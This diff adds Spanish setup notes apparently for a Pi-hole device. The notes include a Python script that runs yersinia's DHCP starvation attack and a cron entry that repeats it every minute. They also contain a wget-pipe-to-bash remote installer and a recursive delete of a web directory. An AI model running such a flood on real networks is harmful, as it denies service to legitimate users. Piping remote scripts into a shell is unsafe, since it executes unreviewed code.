@@ -1,0 +1,57 @@
+#clonar repositorio
+
+cd /var/www/html
+sudo rm -r admin/
+sudo git clone --depth 1 https://github.com/Elisfer11/prueba_interfaz.git admin
+
+#DHCP Starvation
+cd ~
+sudo apt-get install yersinia
+
+ir a pi-hole y activar dhcp
+
+#crear el archivo
+cd ~
+sudo su
+pluma automatizacion.py
+
+copiar esto en automatizacion.py:
+#***************************************************************************************************************
+
+import subprocess
+import time
+
+#primero instalar yersinia con:
+#sudo apt-get install yersinia
+
+#yersinia tiene interfaz grafica, me costo mucho encontrar la forma para iniciar el proceso con comandos: https://kali-linux.net/article/yersinia/
+
+#aqui almaceno el comando para inicializar el ataque
+comando = "yersinia dhcp -attack 1"
+
+# Ejecuta el comando en el shell
+proceso = subprocess.Popen(comando, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+
+# En un segundo se envian al rededor de 32mil paquetes DHCP
+time.sleep(1)
+
+# Envía una tecla al shell para finalizar el proceso
+proceso.stdin.write("\n")
+proceso.stdin.flush()
+
+#Con la cancelacion del proceso en apenas un segundo, evitara que se caiga la red.
+
+#*****************************************************************************************
+
+
+crontab -e
+#baje hasta abajo 
+* * * * * python3 /home/odroid/automatizacion.py
+
+
+#Ahora se espera a que pase un minuto y desactiva y activa el wifi del celular y comprueba en pi-hole si aparece en el dhcp
+
+#instalacion de teamviewer
+wget -qO- https://raw.githubusercontent.com/Botspot/pi-apps/master/install | bash
+
+#Buscar teamviewer en la interfaz e instalarlo
